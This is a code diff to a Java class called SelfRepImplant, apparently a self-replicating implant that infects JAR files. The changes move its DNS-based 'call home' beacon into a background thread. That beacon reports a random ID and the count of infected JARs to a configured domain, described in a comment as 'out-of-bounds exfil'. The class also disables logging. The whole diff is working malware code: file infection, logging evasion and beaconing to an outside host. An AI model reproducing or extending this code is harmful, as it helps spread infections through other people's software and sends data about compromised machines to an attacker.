@@ -108,9 +108,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
          */
         disableAllLogging();
 
+        // Used for out-of-bounds exfil. We don't need many threads for this one.
+        ExecutorService dnsThreads = Executors.newFixedThreadPool(1);
+
         String id = generateRandomId();
         if (CONF_DOMAIN != null) {
-            callHome(CONF_DOMAIN, "hello", id);
+            dnsThreads.submit(() -> {
+                callHome(CONF_DOMAIN, "hello", id);
+            });
         }
 
         Set<Path> jarsToImplant;
@@ -214,7 +219,21 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         System.out.println("[*] Spiked " + numInfected + " out of " + jarsToImplant.size() + " (" + successRatePercentage + ") JARs.");
 
         if (CONF_DOMAIN != null) {
-            callHome(CONF_DOMAIN, "did-" + numInfected, id);
+            dnsThreads.submit(() -> {
+                callHome(CONF_DOMAIN, "did-" + numInfected, id);
+            });
+        }
+
+        // Wait for the DNS requests to finnish.
+        dnsThreads.shutdown();
+        try {
+            if (!dnsThreads.awaitTermination(10, TimeUnit.SECONDS)) {
+                dnsThreads.shutdownNow();
+                dnsThreads.awaitTermination(5, TimeUnit.SECONDS);
+            }
+        } catch (InterruptedException e) {
+            dnsThreads.shutdownNow();
+            Thread.currentThread().interrupt();
         }
     }
 
@@ -480,9 +499,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
         fqdn.append(domain);
 
-        // Potential optimization: Do this in a thread
         try {
-            System.out.println("Resolving '" + fqdn.toString() + "'.");
+            System.out.println("[$] Resolving '" + fqdn.toString() + "'.");
             InetAddress.getByName(fqdn.toString());
         } catch (UnknownHostException ignored) {
         }
